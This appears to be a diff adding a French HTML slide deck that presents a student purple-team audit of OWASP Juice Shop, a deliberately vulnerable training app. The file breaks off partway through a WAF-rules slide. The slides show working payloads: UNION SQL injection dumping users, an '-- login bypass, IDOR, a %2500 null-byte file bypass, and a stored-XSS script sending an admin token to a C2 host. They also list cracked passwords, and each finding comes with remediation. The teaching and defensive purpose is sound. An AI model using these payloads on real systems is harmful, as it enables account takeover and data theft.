@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Purple Team — OWASP Juice Shop</title>
+<link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Syne:wght@400;500;700;800&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#07090f;
+  --surface:#0d1117;
+  --surface2:#131a24;
+  --border:#1b2535;
+  --border2:#243044;
+  --red:#e05555;
+  --red-dim:#3d1515;
+  --red-border:#6b2020;
+  --orange:#e07a30;
+  --orange-dim:#2e1a08;
+  --orange-border:#6b3810;
+  --green:#3db87a;
+  --green-dim:#082d1a;
+  --green-border:#0e5a33;
+  --blue:#4a9de0;
+  --blue-dim:#0b1e35;
+  --blue-border:#1a4a7a;
+  --purple:#8b6fe0;
+  --purple-dim:#1a1030;
+  --purple-border:#4a2fa0;
+  --text:#d4dce8;
+  --text-muted:#5a7090;
+  --text-dim:#3a4f65;
+  --mono:'DM Mono',monospace;
+  --sans:'DM Sans',sans-serif;
+  --display:'Syne',sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{width:100%;height:100%;overflow:hidden;background:var(--bg)}
+body{font-family:var(--sans);color:var(--text)}
+
+/* ── Scanline texture ── */
+body::before{
+  content:'';position:fixed;inset:0;pointer-events:none;z-index:1000;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.03) 2px,rgba(0,0,0,.03) 4px);
+}
+
+.deck{width:100%;height:100vh;position:relative;overflow:hidden}
+
+/* ── Ambient glow ── */
+.glow{position:absolute;border-radius:50%;filter:blur(80px);opacity:0.06;pointer-events:none;transition:opacity 1s}
+.glow-r{width:600px;height:600px;background:var(--red);top:-200px;right:-200px}
+.glow-b{width:500px;height:500px;background:var(--blue);bottom:-200px;left:-100px}
+
+/* ── Slides ── */
+.slide{
+  position:absolute;inset:0;
+  display:flex;flex-direction:column;justify-content:center;align-items:center;
+  padding:48px 72px;
+  opacity:0;transform:translateY(24px) scale(.98);
+  transition:opacity .5s cubic-bezier(.4,0,.2,1),transform .5s cubic-bezier(.4,0,.2,1);
+  pointer-events:none;
+}
+.slide.active{opacity:1;transform:none;pointer-events:all}
+.slide.out{opacity:0;transform:translateY(-24px) scale(.98)}
+
+/* ── Typography ── */
+.eyebrow{font-family:var(--mono);font-size:10px;letter-spacing:.15em;text-transform:uppercase;color:var(--text-muted);margin-bottom:14px}
+.h1{font-family:var(--display);font-size:48px;font-weight:800;line-height:1.1;letter-spacing:-.5px;color:#e8f0fa}
+.h2{font-family:var(--display);font-size:28px;font-weight:700;line-height:1.15;color:#e8f0fa;margin-bottom:6px}
+.h3{font-family:var(--display);font-size:16px;font-weight:700;color:var(--text);margin-bottom:4px}
+.sub{font-size:14px;color:var(--text-muted);line-height:1.65}
+.mono{font-family:var(--mono);font-size:12px}
+
+/* ── Cards ── */
+.card{background:var(--surface2);border:1px solid var(--border);border-radius:10px;padding:16px 20px}
+.card-red{background:var(--red-dim);border-color:var(--red-border)}
+.card-orange{background:var(--orange-dim);border-color:var(--orange-border)}
+.card-green{background:var(--green-dim);border-color:var(--green-border)}
+.card-blue{background:var(--blue-dim);border-color:var(--blue-border)}
+.card-purple{background:var(--purple-dim);border-color:var(--purple-border)}
+
+/* ── Badges ── */
+.badge{display:inline-flex;align-items:center;gap:5px;font-family:var(--mono);font-size:10px;font-weight:500;letter-spacing:.08em;text-transform:uppercase;padding:3px 10px;border-radius:20px}
+.b-red{background:var(--red-dim);color:#f09090;border:1px solid var(--red-border)}
+.b-orange{background:var(--orange-dim);color:#f0a870;border:1px solid var(--orange-border)}
+.b-green{background:var(--green-dim);color:#70d0a0;border:1px solid var(--green-border)}
+.b-blue{background:var(--blue-dim);color:#80b8e8;border:1px solid var(--blue-border)}
+.b-purple{background:var(--purple-dim);color:#b0a0e8;border:1px solid var(--purple-border)}
+
+/* ── Code blocks ── */
+.code{background:#030507;border:1px solid var(--border);border-radius:8px;padding:14px 18px;font-family:var(--mono);font-size:12px;line-height:1.8;color:#8ab4d0;overflow:hidden}
+.c-red{color:#f09090}.c-green{color:#70d0a0}.c-orange{color:#f0c070}.c-blue{color:#80b8e8}.c-muted{color:var(--text-muted)}
+
+/* ── Stats ── */
+.stat{text-align:center;padding:18px 24px;background:var(--surface2);border:1px solid var(--border);border-radius:12px}
+.stat-n{font-family:var(--display);font-size:36px;font-weight:800;line-height:1}
+.stat-l{font-family:var(--mono);font-size:10px;letter-spacing:.1em;text-transform:uppercase;color:var(--text-muted);margin-top:6px}
+
+/* ── Table ── */
+table{width:100%;border-collapse:collapse;font-size:13px}
+th{font-family:var(--mono);font-size:10px;letter-spacing:.1em;text-transform:uppercase;color:var(--text-dim);padding:8px 12px;border-bottom:1px solid var(--border);text-align:left}
+td{padding:9px 12px;border-bottom:1px solid var(--border2);color:var(--text);vertical-align:middle}
+tr:last-child td{border-bottom:none}
+
+/* ── Progress bar ── */
+#prog{position:fixed;top:0;left:0;height:2px;background:linear-gradient(90deg,var(--blue),var(--purple));transition:width .4s ease;z-index:200}
+
+/* ── Nav ── */
+.nav{position:fixed;bottom:24px;left:0;right:0;display:flex;flex-direction:column;align-items:center;gap:10px;z-index:100}
+.dots{display:flex;gap:6px;align-items:center}
+.dot{width:6px;height:6px;border-radius:3px;background:var(--border2);cursor:pointer;transition:all .25s;border:none;padding:0}
+.dot.on{width:20px;background:var(--blue)}
+.btns{display:flex;gap:8px}
+.btn{background:var(--surface2);border:1px solid var(--border);border-radius:8px;color:var(--text-muted);cursor:pointer;padding:7px 20px;font-size:12px;font-family:var(--sans);transition:all .2s;letter-spacing:.02em}
+.btn:hover{background:var(--border);color:var(--text)}
+.slide-num{font-family:var(--mono);font-size:11px;color:var(--text-dim);min-width:60px;text-align:center}
+
+/* ── Divider ── */
+.div-v{width:1px;background:var(--border);align-self:stretch;margin:0 4px}
+
+/* ── Demo panel ── */
+.demo-btn{
+  display:inline-flex;align-items:center;gap:10px;
+  background:linear-gradient(135deg,var(--red-dim),var(--orange-dim));
+  border:1px solid var(--red-border);border-radius:12px;
+  padding:14px 28px;font-family:var(--display);font-size:15px;font-weight:700;
+  color:#f09090;cursor:pointer;transition:all .25s;letter-spacing:.02em;
+}
+.demo-btn:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(224,85,85,.2)}
+.demo-btn-blue{
+  background:linear-gradient(135deg,var(--blue-dim),var(--purple-dim));
+  border-color:var(--blue-border);color:#80b8e8;
+}
+.demo-btn-blue:hover{box-shadow:0 8px 24px rgba(74,157,224,.2)}
+.demo-btn-green{
+  background:linear-gradient(135deg,var(--green-dim),#082a1a);
+  border-color:var(--green-border);color:#70d0a0;
+}
+.demo-btn-green:hover{box-shadow:0 8px 24px rgba(61,184,122,.2)}
+
+/* ── Terminal ── */
+.terminal{background:#020408;border:1px solid var(--border);border-radius:10px;overflow:hidden;font-family:var(--mono);font-size:12px}
+.term-bar{background:var(--surface2);padding:8px 14px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--border)}
+.term-dot{width:10px;height:10px;border-radius:50%}
+.term-body{padding:14px 18px;line-height:1.9;color:#8ab4d0}
+
+/* ── Remédiation pill ── */
+.rem{display:flex;gap:12px;align-items:flex-start;padding:12px 16px;background:var(--green-dim);border:1px solid var(--green-border);border-radius:8px}
+.rem-icon{font-size:14px;flex-shrink:0;margin-top:1px}
+.rem-text{font-size:13px;color:var(--text);line-height:1.55}
+
+/* ── Members tag ── */
+.member{font-family:var(--mono);font-size:11px;padding:5px 12px;background:var(--surface2);border:1px solid var(--border);border-radius:6px;color:var(--text-muted)}
+</style>
+</head>
+<body>
+<div id="prog"></div>
+
+<div class="deck" id="deck">
+  <div class="glow glow-r"></div>
+  <div class="glow glow-b"></div>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       SLIDE 0 — TITRE
+  ═══════════════════════════════════════════════════════════════ -->
+  <div class="slide active" id="s0">
+    <div style="text-align:center;max-width:760px">
+      <div style="display:flex;gap:8px;justify-content:center;margin-bottom:32px">
+        <span class="badge b-red">Red Team</span>
+        <span class="badge b-purple">Purple Team</span>
+        <span class="badge b-blue">Blue Team</span>
+      </div>
+      <h1 class="h1" style="font-size:52px;margin-bottom:18px">Audit de sécurité<br><span style="color:var(--blue)">OWASP Juice Shop</span></h1>
+      <p class="sub" style="font-size:15px;margin-bottom:36px">
+        Juice Shop v6.2.0-SNAPSHOT &nbsp;·&nbsp; Docker localhost:3000<br>
+        13–16 avril 2026 &nbsp;·&nbsp; M1PPAW &nbsp;·&nbsp; Purple Team
+      </p>
+      <div style="display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin-bottom:36px">
+        <span class="member">ANANI Georges Lionel</span>
+        <span class="member">KOUAME Marc</span>
+        <span class="member">SELLAK Mohammed</span>
+        <span class="member">OUBENAZHA Rachid</span>
+      </div>
+      <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:12px;max-width:600px;margin:0 auto">
+        <div class="stat"><div class="stat-n" style="color:var(--red)">5</div><div class="stat-l">Vulnérabilités</div></div>
+        <div class="stat"><div class="stat-n" style="color:var(--orange)">22</div><div class="stat-l">Comptes dumpés</div></div>
+        <div class="stat"><div class="stat-n" style="color:var(--green)">4</div><div class="stat-l">MDP crackés</div></div>
+        <div class="stat"><div class="stat-n" style="color:var(--blue)">56%</div><div class="stat-l">Score WAF</div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       SLIDE 1 — MÉTHODOLOGIE
+  ═══════════════════════════════════════════════════════════════ -->
+  <div class="slide" id="s1">
+    <div style="max-width:820px;width:100%">
+      <div class="eyebrow">Méthodologie · PTES + OWASP Testing Guide v4</div>
+      <h2 class="h2">Kill chain en 5 phases</h2>
+      <p class="sub" style="margin-bottom:28px">Progression structurée : de la reconnaissance au rapport défensif</p>
+      <div style="display:flex;flex-direction:column;gap:8px">
+        <div style="display:flex;align-items:center;gap:14px">
+          <div style="width:32px;height:32px;border-radius:8px;background:var(--blue-dim);border:1px solid var(--blue-border);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:12px;color:var(--blue);flex-shrink:0">01</div>
+          <div class="card" style="flex:1;padding:12px 18px;display:flex;gap:16px;align-items:center">
+            <span class="h3" style="color:var(--blue);min-width:140px">Reconnaissance</span>
+            <span class="sub">nikto · gobuster · whatweb · headers · cartographie endpoints</span>
+          </div>
+        </div>
+        <div style="display:flex;align-items:center;gap:14px">
+          <div style="width:32px;height:32px;border-radius:8px;background:var(--red-dim);border:1px solid var(--red-border);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:12px;color:var(--red);flex-shrink:0">02</div>
+          <div class="card" style="flex:1;padding:12px 18px;display:flex;gap:16px;align-items:center">
+            <span class="h3" style="color:var(--red);min-width:140px">Exploitation</span>
+            <span class="sub">SQLi UNION · login bypass · XSS stocké · IDOR · FTP null byte bypass</span>
+          </div>
+        </div>
+        <div style="display:flex;align-items:center;gap:14px">
+          <div style="width:32px;height:32px;border-radius:8px;background:var(--orange-dim);border:1px solid var(--orange-border);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:12px;color:var(--orange);flex-shrink:0">03</div>
+          <div class="card" style="flex:1;padding:12px 18px;display:flex;gap:16px;align-items:center">
+            <span class="h3" style="color:var(--orange);min-width:140px">Post-exploitation</span>
+            <span class="sub">dump Users (22) · crack MD5 (John) · exfiltration FTP · session hijacking</span>
+          </div>
+        </div>
+        <div style="display:flex;align-items:center;gap:14px">
+          <div style="width:32px;height:32px;border-radius:8px;background:var(--green-dim);border:1px solid var(--green-border);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:12px;color:var(--green);flex-shrink:0">04</div>
+          <div class="card" style="flex:1;padding:12px 18px;display:flex;gap:16px;align-items:center">
+            <span class="h3" style="color:var(--green);min-width:140px">Défense Blue Team</span>
+            <span class="sub">WAF Nginx + ModSecurity · 8 règles custom · ELK SIEM · rate limiting</span>
+          </div>
+        </div>
+        <div style="display:flex;align-items:center;gap:14px">
+          <div style="width:32px;height:32px;border-radius:8px;background:var(--purple-dim);border:1px solid var(--purple-border);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:12px;color:var(--purple);flex-shrink:0">05</div>
+          <div class="card" style="flex:1;padding:12px 18px;display:flex;gap:16px;align-items:center">
+            <span class="h3" style="color:var(--purple);min-width:140px">Validation Purple</span>
+            <span class="sub">16 tests automatisés · score 56% · plan correctif 5 actions · rapport OWASP</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       SLIDE 2 — VULN-01 SQLi UNION
+  ═══════════════════════════════════════════════════════════════ -->
+  <div class="slide" id="s2">
+    <div style="max-width:860px;width:100%">
+      <div style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap">
+        <span class="badge b-red">VULN-01 · Critique · CVSS 9.8</span>
+        <span class="badge b-red">CWE-89 · OWASP A03:2021</span>
+      </div>
+      <h2 class="h2">Injection SQL UNION-based</h2>
+      <p class="sub" style="margin-bottom:18px">Paramètre <code style="color:var(--blue);background:var(--blue-dim);padding:1px 6px;border-radius:4px;font-family:var(--mono);font-size:11px">q</code> non filtré sur <code style="color:var(--blue);background:var(--blue-dim);padding:1px 6px;border-radius:4px;font-family:var(--mono);font-size:11px">/rest/products/search</code> — SQLite — 9 colonnes</p>
+      <div style="display:grid;grid-template-columns:1.1fr 1fr;gap:14px">
+        <div>
+          <div class="code" style="margin-bottom:10px">
+<span class="c-orange">GET</span> /rest/products/search?q=<br>
+<span class="c-red">  test')) UNION SELECT</span><br>
+<span class="c-green">  id,email,password,role,</span><br>
+<span class="c-green">  username,5,6,7,8</span><br>
+<span class="c-red">  FROM Users--</span><br>
+<span class="c-green">→ HTTP 200 · 22 users exfiltrés</span>
+          </div>
+          <div class="code" style="font-size:11px">
+<span class="c-muted">admin@juice-sh.op | admin | </span><span class="c-orange">0192023a...</span><br>
+<span class="c-muted">bender@juice-sh.op | customer | </span><span class="c-orange">0c36e517...</span><br>
+<span class="c-muted">support@juice-sh.op | admin | </span><span class="c-orange">3869433d...</span>
+          </div>
+        </div>
+        <div style="display:flex;flex-direction:column;gap:10px">
+          <div class="card">
+            <div class="eyebrow" style="margin-bottom:8px">Impact</div>
+            <div class="sub" style="line-height:1.7">22 utilisateurs (7 admins)<br>Hashes MD5, rôles, tokens<br>Schéma BDD via sqlite_master<br>Violation RGPD massive</div>
+          </div>
+          <div class="rem">
+            <span class="rem-icon">🛡️</span>
+            <div class="rem-text"><strong style="color:var(--green)">Remédiation :</strong><br>
+            Utiliser des <strong>requêtes préparées</strong> (Sequelize, PreparedStatement). Valider <code style="font-family:var(--mono);font-size:11px">q</code> côté serveur (whitelist alphanumérique, max 100 chars). WAF-001 : bloquer <code style="font-family:var(--mono);font-size:11px">UNION SELECT</code>, <code style="font-family:var(--mono);font-size:11px">sqlite_master</code>.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       SLIDE 3 — VULN-02 SQLi Login
+  ═══════════════════════════════════════════════════════════════ -->
+  <div class="slide" id="s3">
+    <div style="max-width:860px;width:100%">
+      <div style="display:flex;gap:8px;margin-bottom:16px">
+        <span class="badge b-red">VULN-02 · Critique · CVSS 9.1</span>
+        <span class="badge b-red">CWE-287 · OWASP A07:2021</span>
+      </div>
+      <h2 class="h2">Bypass d'authentification par SQLi</h2>
+      <p class="sub" style="margin-bottom:18px">L'injection <code style="color:var(--red);background:var(--red-dim);padding:1px 6px;border-radius:4px;font-family:var(--mono);font-size:11px">'--</code> sur le champ email supprime la vérification du mot de passe</p>
+      <div style="display:grid;grid-template-columns:1.1fr 1fr;gap:14px">
+        <div>
+          <div class="code" style="margin-bottom:10px">
+<span class="c-orange">POST</span> /rest/user/login<br>
+<span class="c-muted">{</span><br>
+<span class="c-muted">  "email": </span><span class="c-red">"bender@juice-sh.op'--"</span><span class="c-muted">,</span><br>
+<span class="c-muted">  "password": </span><span class="c-orange">"x"</span><br>
+<span class="c-muted">}</span>
+          </div>
+          <div class="code">
+<span class="c-green">→ HTTP 200</span><br>
+<span class="c-muted">{ "authentication": {</span><br>
+<span class="c-green">    "token": "eyJ0eXAiOiJKV1Q..."</span><span class="c-muted">,</span><br>
+<span class="c-muted">    "umail": "bender@juice-sh.op"</span><br>
+<span class="c-muted">}}</span><br>
+<span class="c-green"># JWT valide — sans mot de passe</span>
+          </div>
+        </div>
+        <div style="display:flex;flex-direction:column;gap:10px">
+          <div class="card-red card" style="padding:12px 16px">
+            <div class="eyebrow" style="margin-bottom:8px;color:var(--red)">Impact</div>
+            <div class="sub" style="line-height:1.7">Accès à n'importe quel compte dont l'email est connu. Combiné au dump SQLi : <strong style="color:var(--text)">tous les comptes compromis</strong>.</div>
+          </div>
+          <div class="rem">
+            <span class="rem-icon">🛡️</span>
+            <div class="rem-text"><strong style="color:var(--green)">Remédiation :</strong><br>
+            Requêtes préparées sur la requête d'auth. WAF-002 : bloquer <code style="font-family:var(--mono);font-size:11px">'--</code>, <code style="font-family:var(--mono);font-size:11px">' OR</code> dans les corps JSON. Rate limiting : 5 tentatives/min par IP. Alerter le SIEM sur les 401 répétés.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       SLIDE 4 — VULN-03 IDOR
+  ═══════════════════════════════════════════════════════════════ -->
+  <div class="slide" id="s4">
+    <div style="max-width:860px;width:100%">
+      <div style="display:flex;gap:8px;margin-bottom:16px">
+        <span class="badge b-orange">VULN-03 · Haute · CVSS 8.1</span>
+        <span class="badge b-orange">CWE-639 · OWASP A01:2021</span>
+      </div>
+      <h2 class="h2">IDOR — Accès non autorisé aux ressources</h2>
+      <p class="sub" style="margin-bottom:18px">Aucune vérification que la ressource demandée appartient à l'utilisateur authentifié</p>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:12px">
+        <div>
+          <div class="eyebrow" style="margin-bottom:8px;color:var(--orange)">IDOR Read — /api/Users/{'{id}'}</div>
+          <div class="code" style="font-size:11px">
+<span class="c-muted"># Token Bender (id=3) → accède à :</span><br>
+<span class="c-green">User 1</span> <span class="c-muted">admin@juice-sh.op</span> <span class="c-red">[admin]</span><br>
+<span class="c-green">User 2</span> <span class="c-muted">jim@juice-sh.op</span><br>
+<span class="c-green">User 5</span> <span class="c-muted">ciso@juice-sh.op</span> <span class="c-red">[deluxe]</span><br>
+<span class="c-green">User 6</span> <span class="c-muted">support@juice-sh.op</span> <span class="c-red">[admin]</span><br>
+<span class="c-orange">HTTP 200 sur IDs 1 à 22</span>
+          </div>
+        </div>
+        <div>
+          <div class="eyebrow" style="margin-bottom:8px;color:var(--orange)">IDOR Read — /rest/basket/{'{id}'}</div>
+          <div class="code" style="font-size:11px">
+<span class="c-muted"># Panier admin (basket 1) :</span><br>
+<span class="c-green">Apple Juice x2</span>    <span class="c-muted">= 3.98€</span><br>
+<span class="c-green">Orange Juice x3</span>   <span class="c-muted">= 8.97€</span><br>
+<span class="c-green">Eggfruit Juice x1</span> <span class="c-muted">= 8.99€</span><br>
+<span class="c-orange">HTTP 200 sur IDs 1 à 5</span>
+          </div>
+        </div>
+      </div>
+      <div class="rem">
+        <span class="rem-icon">🛡️</span>
+        <div class="rem-text"><strong style="color:var(--green)">Remédiation :</strong>
+        Vérifier côté serveur que <code style="font-family:var(--mono);font-size:11px">token.userId === requestedId</code> avant de servir la ressource. Implémenter un middleware d'autorisation (principe du moindre privilège). Journaliser chaque accès cross-user dans le SIEM (WAF-008).</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       SLIDE 5 — VULN-04 FTP + VULN-05 XSS
+  ═══════════════════════════════════════════════════════════════ -->
+  <div class="slide" id="s5">
+    <div style="max-width:860px;width:100%">
+      <div style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap">
+        <span class="badge b-orange">VULN-04 · Haute · CVSS 7.5 · FTP Bypass</span>
+        <span class="badge b-orange">VULN-05 · Haute · CVSS 7.2 · XSS Stocké</span>
+      </div>
+      <h2 class="h2">Null byte bypass + XSS persistant</h2>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:16px">
+        <div>
+          <div class="eyebrow" style="margin-bottom:8px;color:var(--orange)">FTP bypass via double encodage %2500</div>
+          <div class="code" style="margin-bottom:10px;font-size:11px">
+<span class="c-red">GET</span> /ftp/package.json.bak<span class="c-green">%2500</span>.md<br>
+<span class="c-green">→ HTTP 200</span> <span class="c-muted"># filtre .md/.pdf contourné</span>
+          </div>
+          <div class="sub" style="line-height:1.9;font-size:12px">Fichiers récupérés :<br>
+            <span style="color:var(--orange)">encrypt.pyc · incident-support.kdbx</span><br>
+            <span style="color:var(--orange)">package.json.bak · coupons_2013</span>
+          </div>
+          <div class="rem" style="margin-top:10px">
+            <span class="rem-icon">🛡️</span>
+            <div class="rem-text" style="font-size:12px"><strong style="color:var(--green)">Rem. :</strong> Normaliser l'URI avant validation (décoder %25→% puis vérifier). Bloquer tout path contenant <code style="font-family:var(--mono)">%00</code>, <code style="font-family:var(--mono)">%2500</code>. Règle WAF-003.</div>
+          </div>
+        </div>
+        <div>
+          <div class="eyebrow" style="margin-bottom:8px;color:var(--orange)">XSS stocké — avis produits</div>
+          <div class="code" style="margin-bottom:10px;font-size:11px">
+<span class="c-red">PUT</span> /rest/products/1/reviews<br>
+<span class="c-muted">{</span><br>
+<span class="c-red">  "&lt;script&gt;fetch(c2+localStorage.token)&lt;/script&gt;"</span><br>
+<span class="c-muted">}</span><br>
+<span class="c-green">→ payload persisté en base ✓</span><br>
+<span class="c-green">→ token admin exfiltré ✓</span>
+          </div>
+          <div class="rem">
+            <span class="rem-icon">🛡️</span>
+            <div class="rem-text" style="font-size:12px"><strong style="color:var(--green)">Rem. :</strong> Sanitiser avec DOMPurify côté serveur. Header <code style="font-family:var(--mono)">Content-Security-Policy: default-src 'self'</code>. Stocker JWT en cookie <code style="font-family:var(--mono)">HttpOnly</code> — inaccessible depuis JS.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       SLIDE 6 — EXPLOIT CHAIN
+  ═══════════════════════════════════════════════════════════════ -->
+  <div class="slide" id="s6">
+    <div style="max-width:820px;width:100%">
+      <div class="eyebrow">Chaine d'exploitation · Impact maximum</div>
+      <h2 class="h2">XSS stocké → Vol JWT → Session hijacking admin</h2>
+      <p class="sub" style="margin-bottom:24px">3 vulnérabilités enchaînées — compromission admin complète, zéro interaction après injection</p>
+      <div style="display:flex;flex-direction:column;gap:0">
+        <div style="display:flex;gap:14px;padding:14px 0;border-bottom:1px solid var(--border2)">
+          <div style="width:28px;height:28px;border-radius:50%;background:var(--red-dim);border:1px solid var(--red-border);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:11px;color:var(--red);flex-shrink:0;font-weight:500;margin-top:2px">1</div>
+          <div style="flex:1">
+            <div class="h3" style="color:var(--red);margin-bottom:4px">Injection du payload</div>
+            <div class="sub" style="font-size:13px">Attaquant injecte <code style="font-family:var(--mono);font-size:11px;color:var(--red);background:var(--red-dim);padding:1px 5px;border-radius:3px">&lt;script&gt;fetch(c2+"?t="+localStorage.getItem("token"))&lt;/script&gt;</code> dans les reviews du produit #1 via PUT authentifié (SQLi bypass).</div>
+          </div>
+        </div>
+        <div style="display:flex;gap:14px;padding:14px 0;border-bottom:1px solid var(--border2)">
+          <div style="width:28px;height:28px;border-radius:50%;background:var(--orange-dim);border:1px solid var(--orange-border);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:11px;color:var(--orange);flex-shrink:0;font-weight:500;margin-top:2px">2</div>
+          <div style="flex:1">
+            <div class="h3" style="color:var(--orange);margin-bottom:4px">Exécution silencieuse</div>
+            <div class="sub" style="font-size:13px">L'admin visite la page Apple Juice → le navigateur charge les avis → le <code style="font-family:var(--mono);font-size:11px;color:var(--orange);background:var(--orange-dim);padding:1px 5px;border-radius:3px">&lt;script&gt;</code> s'exécute automatiquement. Le JWT est lu depuis <code style="font-family:var(--mono);font-size:11px">localStorage</code> et envoyé silencieusement au C2 :9999.</div>
+          </div>
+        </div>
+        <div style="display:flex;gap:14px;padding:14px 0">
+          <div style="width:28px;height:28px;border-radius:50%;background:var(--green-dim);border:1px solid var(--green-border);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:11px;color:var(--green);flex-shrink:0;font-weight:500;margin-top:2px">3</div>
+          <div style="flex:1">
+            <div class="h3" style="color:var(--green);margin-bottom:4px">Contrôle total</div>
+            <div class="sub" style="font-size:13px">Token reçu → accès complet à <code style="font-family:var(--mono);font-size:11px">/api/Users</code> (22 comptes), <code style="font-family:var(--mono);font-size:11px">/api/Feedbacks</code>, paniers, commandes. JWT décodé : email, rôle admin, hash MD5 embarqué.</div>
+          </div>
+        </div>
+      </div>
+      <div class="card" style="margin-top:14px;padding:12px 18px;border-color:var(--blue-border);display:flex;gap:20px;align-items:center">
+        <span class="sub">Vulnérabilités chaînées :</span>
+        <span style="font-size:13px;color:var(--red)">XSS Stocké (A03)</span>
+        <span style="color:var(--border2)">+</span>
+        <span style="font-size:13px;color:var(--orange)">JWT in localStorage (A02)</span>
+        <span style="color:var(--border2)">+</span>
+        <span style="font-size:13px;color:var(--blue)">Absence CSP (A05)</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       SLIDE 7 — PASSWORD CRACKING
+  ═══════════════════════════════════════════════════════════════ -->
+  <div class="slide" id="s7">
+    <div style="max-width:820px;width:100%">
+      <div class="eyebrow">Post-exploitation · John the Ripper · rockyou.txt</div>
+      <h2 class="h2">22 hashes MD5 — 4 crackés en &lt; 2 s</h2>
+      <p class="sub" style="margin-bottom:20px">MD5 sans sel = algorithme obsolète (1991). rockyou.txt suffit à compromettre les comptes principaux.</p>
+      <table style="margin-bottom:14px">
+        <thead><tr><th>Email</th><th>Rôle</th><th>Hash MD5</th><th>Mot de passe clair</th></tr></thead>
+        <tbody>
+          <tr><td style="color:var(--red)">admin@juice-sh.op</td><td><span class="badge b-red">admin</span></td><td class="mono" style="color:var(--text-muted)">0192023a7bbd...</td><td style="color:var(--green);font-weight:500;font-family:var(--mono)">admin123</td></tr>
+          <tr><td>bender@juice-sh.op</td><td><span class="badge b-blue">customer</span></td><td class="mono" style="color:var(--text-muted)">0c36e517e3fa...</td><td style="color:var(--green);font-weight:500;font-family:var(--mono)">ncc-1701</td></tr>
+          <tr><td>morty@juice-sh.op</td><td><span class="badge b-blue">customer</span></td><td class="mono" style="color:var(--text-muted)">f2f933d0bb0b...</td><td style="color:var(--green);font-weight:500;font-family:var(--mono)">private</td></tr>
+          <tr><td>demo</td><td><span class="badge b-blue">customer</span></td><td class="mono" style="color:var(--text-muted)">fe01ce2a7fba...</td><td style="color:var(--green);font-weight:500;font-family:var(--mono)">demo</td></tr>
+        </tbody>
+      </table>
+      <div class="rem">
+        <span class="rem-icon">🛡️</span>
+        <div class="rem-text"><strong style="color:var(--green)">Remédiation :</strong>
+        Remplacer MD5 par <strong>bcrypt</strong> (coût ≥ 12) ou <strong>Argon2id</strong> avec sel aléatoire unique par utilisateur. Imposer une politique de mots de passe (min 12 chars, complexité). Forcer le changement des mots de passe compromis. Activer MFA sur les comptes admin.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       SLIDE 8 — BLUE TEAM / WAF
+  ═══════════════════════════════════════════════════════════════ -->
+  <div class="slide" id="s8">
+    <div style="max-width:860px;width:100%">
+      <div class="eyebrow">Blue Team · Défense active</div>
+      <h2 class="h2">Architecture WAF + SIEM déployée</h2>
+      <p class="sub" style="margin-bottom:20px">Nginx + ModSecurity devant Juice Shop · 8 règles custom · ELK Stack</p>
+      <div style="display:grid;grid-template-columns:1.2fr 1fr;gap:14px">
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <div class="eyebrow" style="margin-bottom:2px;color:var(--green)">Règles ModSecurity actives</div>
+          <div class="card" style="padding:10px 14px;display:flex;justify-content:space-between;align-items:center">
+            <span class="mono" style="color:var(--blue)">WAF-001</span>
+            <span class="sub" style="font-size:12px">SQLi UNION SELECT sur /search</span>
+            <span class="badge b-red">FAIL</span>
+          </div>
+          <div class="card" style="padding:10px 14px;display:flex;justify-content:space-between;align-items:center">
+            <span class="mono" style="color:var(--blue)">WAF-002</span>
+            <span class="sub" style="font-size:12px">SQLi login bypass '–</span>
+            <span class="badge b-green">PASS</span>
+          </div>
+          <div class="card" style="padding:10px 14px;display:flex;justify-content:space-between;align-items:center">
+            <span class="mono" style="color:var(--blue)">WAF-003</span>
+            <span class="sub" style="font-size:12px">FTP null byte %2500</span>
+            <span class="badge b-red">FAIL</span>
+          </div>
+          <div class="card" style="padding:10px 14px;display:flex;justify-content:space-between;align-items:center">
+            <span class="mono" style="color:var(--blue)">WAF-004</span>
+            <span class="sub" style="font-size:12px">XSS &lt;script&gt; / onerror</span>
+            <span class="badge b-green">PASS</span>
+          </div>
+          <div class="card" style="padding:10px 14px;display:flex;justify-content:space-between;align-items:center">
+            <span class="mono" style="color:var(--blue)">WAF-005</span>
+            <span class="sub" style="font-size:12px">SQLi RANDOMBLOB</span>
+            <span class="badge b-red">FAIL</span>
+          </div>
+        </div>
+        <div style="display:flex;flex-direction:column;gap:10px">
